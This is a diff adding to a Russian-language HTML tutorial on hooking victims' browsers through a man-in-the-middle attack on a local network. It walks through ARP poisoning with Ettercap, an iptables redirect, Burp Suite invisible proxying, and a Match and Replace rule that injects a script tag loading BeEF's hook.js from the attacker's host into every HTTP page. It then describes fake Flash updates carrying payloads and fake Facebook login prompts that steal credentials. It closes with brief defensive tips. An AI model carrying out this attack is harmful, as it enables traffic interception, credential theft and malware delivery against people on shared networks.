@@ -75,3 +75,100 @@ XSS (Cross Site Scripting, получил аббревиатуру XSS, а не 
   <li>Нажмите на меню MITM</li>
   <li>Выберите ARP Poisoning, убедитесь, что стоит галочка Sniff remote connections и нажмите ОК</li>
 </ul>
+
+(в другом терминале) 
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo su</pre>
+Чтобы перенаправлять данные с порта 80 на 8080:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</pre>
+
+
+<p><a name="burpsuite"></a></p>
+<h2>Запускаем Burp Suite.</h2>
+
+Запустите Burp Suite.
+<ul>
+  <li>
+    Во вкладке Proxy перейдите в подраздел Options
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;В разделе Proxy Listeners нажмите кнопку Add
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Bind to port укажите порт 8080
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В списке выберите Specific address и в выпадающем меню выберите IP-адрес, который начинается на 192.168.0/1.
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В списке выберите Specific address и в выпадающем меню выберите IP-адрес, который начинается на 192.168.0/1.
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Во вкладке Request Handling поставьте галочку “Support invisible proxying”
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Нажмите ОК
+  </li>
+  <li>
+    Во вкладке Proxy перейдите в подраздел Intercept
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;Нажмите на Intercept is ON для того, чтобы выключить перехват и перевести кнопку в положение Intercept is OFF
+  </li>
+</ul>
+
+
+<p><a name="beef"></a></p>
+<h2>Запускаем BeEF.</h2>
+Запускаем BeEF:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo beef-xss</pre>
+При первом запуске потребует задать логин и пароль. Пароль должен отличаться от beef. Этот логин/пароль потребуется для входа в веб-интерфейс BeEF.
+
+
+<p><a name="configureburpsuite"></a></p>
+<h2>Продолжаем конфигурировать Burp Suite.</h2>
+<ul>
+  <li>Во вкладке Proxy перейдите в подраздел Options</li>
+  <li>&nbsp;&nbsp;&nbsp;&nbsp;Крутите вниз, пока не найдете Match and Replace</li>
+  <li>&nbsp;&nbsp;&nbsp;&nbsp;В этом разделе нажмите кнопку Add</li>
+  <li>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ставим тип Response body</li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Match: вписывайте
+    <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);"><\/head></pre>
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;В поле Replace вписывайте: 
+    <pre class="html4strict" style="font-family:monospace;"><span style="color: #009900;">&lt;<span style="color: #000000; font-weight: bold;">script</span> <span style="color: #000066;">src</span><span style="color: #66cc66;">=</span>”192.168.0<span style="color: #66cc66;">/</span><span style="color: #cc66cc;">1</span>.x:<span style="color: #cc66cc;">3000</span><span style="color: #66cc66;">/</span>hook.js”&gt;&lt;<span style="color: #66cc66;">/</span><span style="color: #000000; font-weight: bold;">script</span>&gt;&lt;<span style="color: #66cc66;">/</span><span style="color: #000000; font-weight: bold;">head</span>&gt;</span></pre>
+    где 192.168.0/1.x - ваш IP-адрес
+  </li>
+  <li>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Поставьте галочку “Regex Match”
+  </li>
+</ul>
+
+Ждите, пока атакуемый откроет страницу http://. Если вам нужно внедрять этот скрипт и на страницы https://, то единственный вариант - использовать Ettercap с модулем SSLStrip (который работает криво). Вариант использовать Bettercap вместо Ettercap - не вариант, т.к. Bettercap занимает порт 8080, хотя вы можете попробовать указать в Burp Suite другой порт и в iptables - также другой, не тестировал.
+
+
+<p><a name="beef"></a></p>
+<h2>Работа с BeEF.</h2>
+BeEF позволяет практически управлять браузером, когда открыта вкладка со скриптом. Можно показать фейковое уведомление об обновлении Flash Player, куда указать исполняемый файл с полезной нагрузкой, показать окно авторизации в Facebook (истекла сессия, введите логин/пароль), после чего он попадет вам в консоль и т.д.
+
+<i>Пример использования в работе...</i>
+
+
+<p><a name="end"></a></p>
+<h2>Подведение итогов. Рекомендации по защите. Полезные ссылки.</h2>
+<h3>Полезные ссылки.</h3>
+<ul>
+  <li><a href="https://cisoclub.ru/rukovodstvo-po-osushhestvleniyu-cross-site-scripting-xss/" target="_blank">Hackware: руководство по осуществлению XSS атаки</a></li>
+  <li><a href="https://ru.wikipedia.org/wiki/Межсайтовый_скриптинг" target="_blank">Википедия: межсайтовый скриптинг</a></li>
+</ul>
+
+<h3>Рекомендации по защите.</h3>
+<ul>
+  <li>Не использовать открытые сети Wi-Fi</li>
+  <li>Поддерживать безопасность личной сети Wi-Fi, иначе будет равноценна открытой сети</li>
+  <li>Использовать расширение NoScript (<a href="https://chrome.google.com/webstore/detail/noscript/doojmbjmlfjjnbmnoijecmcbfeoakpjm" target="_blank">Chrome Web Store</a> | <a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/" target="_blank">Firefox Browser Add-ons</a>)</li>
+</ul>
+
+Итак, мы познакомились с подцеплением на BeEF при помощи Burp Suite.<br><br>
+<a href="../index">Назад к списку статей...</a>
